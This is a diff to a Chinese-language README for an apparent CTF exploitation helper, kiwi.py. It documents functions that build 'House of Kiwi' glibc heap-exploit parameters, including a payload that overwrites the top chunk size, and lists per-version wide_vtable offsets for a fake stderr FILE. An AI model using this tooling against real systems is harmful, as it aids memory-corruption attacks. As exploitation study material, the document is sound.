@@ -40,7 +40,12 @@ C 文件末尾列出了三段 wide-data 偏移和 stderr fake FILE 的伪代码�
 
 ## Python 离线板子
 
-[`kiwi.py`](./kiwi.py) 提供 `build_house_of_kiwi`，只生成 Kiwi 专属触发器的版本参数。
+[`kiwi.py`](./kiwi.py) 提供两个函数：
+
+```text
+build_house_of_kiwi         -> 返回 KiwiPlan
+build_house_of_kiwi_payload -> 返回 top chunk size 字段的 MemoryWrite
+```
 
 ### 函数用途
 
@@ -59,13 +64,21 @@ Kiwi 不是普通 fake FILE 最终触发点，而是：
 ### 最小使用示例
 
 ```python
-from kiwi import build_house_of_kiwi
+from kiwi import build_house_of_kiwi, build_house_of_kiwi_payload
 
 plan = build_house_of_kiwi(version="2.35", top_size=0x21)
 
 # 返回 KiwiPlan
 print(plan.version, hex(plan.top_size), hex(plan.wide_vtable_offset))
 # wide_vtable_offset 用于后续 stderr wide FILE 布局
+
+writes = build_house_of_kiwi_payload(
+    version="2.35",
+    top_size_addr=0x5555000,   # 相邻 top chunk 的 size 字段地址
+    top_size=0x21,
+)
+for w in writes:
+    print(w.label, hex(w.address), w.data.hex())
 ```
 
 ### 对应 PoC
@@ -86,6 +99,16 @@ print(plan.version, hex(plan.top_size), hex(plan.wide_vtable_offset))
 | `version` | 目标版本。 |
 | `top_size` | 要写入的 top size。 |
 | `wide_vtable_offset` | 2.23～2.29 为 `0x130`，2.30 为 `0xf0`，2.31～2.35 为 `0xe0`；用于后续 stderr wide FILE 布局。 |
+
+### 返回对象 `MemoryWrite`
+
+`build_house_of_kiwi_payload` 返回一项写入：
+
+```text
+address = top_size_addr
+data    = top_size 的小端 8 字节
+label   = "top chunk size"
+```
 
 ### 调用者必须提供
 
